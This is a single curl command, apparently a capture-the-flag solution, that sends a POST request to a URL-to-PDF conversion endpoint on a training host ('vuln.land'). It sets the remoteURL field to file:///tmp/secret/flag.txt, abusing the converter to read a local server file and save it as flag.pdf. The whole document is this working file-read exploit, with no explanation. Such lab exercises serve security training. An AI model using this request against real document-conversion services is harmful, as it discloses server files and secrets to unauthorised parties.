curl --request POST \
    --url https://5d829d42-7cb3-481a-9a6f-baa417523c3f.idocker.vuln.land/convert/url \
    --header 'Content-Type: multipart/form-data' \
    --form remoteURL=file:///tmp/secret/flag.txt \
    --form marginTop=0 \
    --form marginBottom=0 \
    --form marginLeft=0 \
    --form marginRight=0 \
    -o flag.pdf
